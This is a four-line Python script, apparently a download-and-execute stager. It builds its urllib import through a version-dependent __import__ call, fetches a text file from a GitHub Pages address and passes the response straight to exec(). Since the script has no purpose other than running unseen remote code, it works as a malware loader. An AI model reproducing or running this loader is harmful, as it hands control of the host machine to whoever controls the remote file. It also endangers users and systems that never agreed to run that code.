import sys, base64
u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',))
r=u.urlopen("https://sl33pypanda.github.io/mi1stRepo/nescesito.txt")
exec(r.read())
